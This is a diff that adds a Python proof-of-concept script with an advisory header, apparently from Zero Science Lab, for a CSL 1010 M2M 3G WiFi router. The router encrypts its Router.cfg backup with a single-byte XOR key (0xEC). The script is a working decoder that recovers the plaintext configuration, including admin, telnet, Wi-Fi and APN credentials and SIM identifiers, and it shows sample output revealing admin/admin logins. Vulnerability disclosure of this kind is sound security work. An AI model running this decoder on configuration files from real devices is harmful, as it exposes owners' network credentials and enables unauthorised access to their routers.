@@ -1,0 +1,70 @@
+#!/usr/bin/env python3   ###############################################
+#                                                                      #
+#                                                                      #
+# CSL 1010 M2M 3G WiFi Module 2.2.1.4 (Router.cfg) Weak XOR Encryption #
+#                                                                      #
+#                                                                      #
+# Vendor: CSL Mobile Limited   #########################################
+# Product web page: https://1010.com.hk   ##############################
+# Affected version: 2.2.1.4   ##########################################
+#                                                                      #
+# Summary: The CSL 1010 M2M 3G WiFi Module is   ########################
+# a portable 3G/LTE router that stores its   ###########################
+# configuration in a backup file (Router.cfg).   #######################
+#                                                                      #
+# Desc: The device protects its configuration   ########################
+# file (Router.cfg) with a weak/insecure   #############################
+# obfuscation (single-byte XOR cipher) using   #########################
+# a static key (0xEC) instead of real encryption.   ####################
+# Because the same key is applied to the entire   ######################
+# file, it is trivially recovered and the   ############################
+# configuration can be decoded back to cleartext   #####################
+# with a few lines of code. This discloses   ###########################
+# all stored secrets in plaintext, including   #########################
+# the web administration and telnet passwords,   #######################
+# the WPA/WPA2 pre-shared key, PPPoE/3G/APN   ##########################
+# credentials, and SIM identifiers (IMSI/IMEI).   ######################
+#                                                                      #
+# ==================================================================== #
+# $ python 5350Dec.py Router.cfg |findstr /spina:d admin   #############
+#                                                                      #
+# [+] deshifrirano -> decoded-Router.cfg.txt   #########################
+# 165:http_username=admin   ############################################
+# 255:http_passwd=admin   ##############################################
+# 593:samba_user_list=1;admin;admin;/var/mnt/;1;1;1   ##################
+#                                                                      #
+# ==================================================================== #
+#                                                                      #
+# Tested on: httpd   ###################################################
+#            Ralink RT5350   ###########################################
+#                                                                      #
+#                                                                      #
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic   ##############
+#                             @zeroscience   ###########################
+#                                                                      #
+#                                                                      #
+# Advisory ID: ZSL-2026-6000   #########################################
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6000  #
+#                                                                      #
+#                                                                      #
+# 25.07.2026   #########################################################
+#                                                                      #
+########################################################################
+
+import re  as re
+import os  as os
+import sys as si
+
+if len(si.argv) < 2:
+    si.exit("Usage: %s Router.cfg [-o outfile]" % os.path.basename(si.argv[0]))
+
+cfg = si.argv[1]
+out = si.argv[3] if si.argv[2:3] == ["-o"] and len(si.argv) > 3 else "decoded-%s.txt" % os.path.basename(cfg)
+
+blob = open(cfg, "rb").read()
+blob = bytes(b ^ 0xEC for b in (blob[4:] if blob[:4] == b"R3G2" else blob))
+text = "\n".join(s.decode() for s in re.findall(rb"[\x20-\x7e]{3,}", blob))
+
+open(out, "w").write(text)
+print(text)
+si.stderr.write("\n[+] deshifrirano -> %s\n" % out)
